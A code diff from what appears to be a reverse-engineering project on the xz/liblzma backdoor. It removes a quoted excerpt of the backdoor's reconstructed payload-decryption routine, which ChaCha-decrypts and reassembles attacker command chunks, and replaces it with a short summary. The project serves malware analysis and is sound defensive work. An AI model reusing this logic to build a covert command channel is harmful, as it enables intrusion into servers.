@@ -3,84 +3,11 @@
 // Calling convention: __stdcall
 // Prototype: BOOL __stdcall decrypt_payload_message(key_payload_t * payload, size_t payload_size, global_context_t * ctx)
 /*
- * AutoDoc: Generated from upstream sources.
- *
- * Source summary (xzre/xzre.h):
- *   @brief decrypts the given backdoor payload
- *
- *   @param payload payload data
- *   @param payload_size size of payload data
- *   @param ctx the global context
- *   @return BOOL TRUE if successfully decrypted, FALSE otherwise
- *
- * Upstream implementation excerpt (xzre/xzre_code/decrypt_payload_message.c):
- *     BOOL decrypt_payload_message(
- *     	key_payload_t *payload,
- *     	size_t payload_size,
- *     	global_context_t *ctx
- *     ){
- *     	backdoor_payload_hdr_t hdr = {0};
- *     	u8 output[ED448_KEY_SIZE] = {0};
- *     
- *     	memcpy(&hdr, payload, sizeof(hdr));
- *     
- *     	if(!payload){
- *     		if(!ctx) return FALSE;
- *     		goto set_state_reset;
- *     	}
- *     
- *     	const size_t header_size = sizeof(payload->hdr) + sizeof(payload->body_length);
- *     	static_assert(header_size == 18);
- *     
- *     	do {
- *     		if(!ctx) break;
- *     		if(ctx->payload_state == 3) return TRUE;
- *     		if(payload_size <= header_size || ctx->payload_state > 1) break;
- *     
- *     		/** decrypt body_size and body * /
- *     		if(!chacha_decrypt(
- *     			payload->data + sizeof(payload->hdr),
- *     			payload_size - sizeof(payload->hdr),
- *     			output,
- *     			payload->hdr.bytes,
- *     			payload->data + sizeof(payload->hdr),
- *     			ctx->imported_funcs)) break;
- *     
- *     		u16 body_length = payload->body_length;
- *     		// body cannot be bigger than remaining length
- *     		if(body_length >= payload_size - header_size){
- *     			break;
- *     		}
- *     		
- *     		// body cannot be bigger than the current data size
- *     		if(body_length >= ctx->payload_data_size - ctx->current_data_size){
- *     			break;
- *     		}
- *     
- *     		/** keep a copy of the last payload body * /
- *     		u8 *data = &ctx->payload_data[ctx->current_data_size];
- *     		__builtin_memcpy(data, payload->body, body_length);
- *     		ctx->current_data_size += body_length;
- *     
- *     		/** decrypt body * /
- *     		if(!chacha_decrypt(
- *     			payload->data + sizeof(payload->hdr),
- *     			payload_size - sizeof(payload->hdr),
- *     			output,
- *     			payload->hdr.bytes,
- *     			payload->data + sizeof(payload->hdr),
- *     			ctx->imported_funcs
- *     		)) break;
- *     
- *     		return TRUE;
- *     	} while(0);
- *     
- *     	set_state_reset:
- *     	ctx->payload_state = PAYLOAD_STATE_INITIAL;
- *     
- *     	return FALSE;
- *     }
+ * AutoDoc: Decrypts an incoming key_payload_t chunk with the recovered ChaCha key, appends it to the staged buffer, and advances the payload state machine. This is how multi-part attacker commands are reassembled before verification.
  */
+
+#include "xzre_types.h"
+
 
 BOOL decrypt_payload_message(key_payload_t *payload,size_t payload_size,global_context_t *ctx)
 
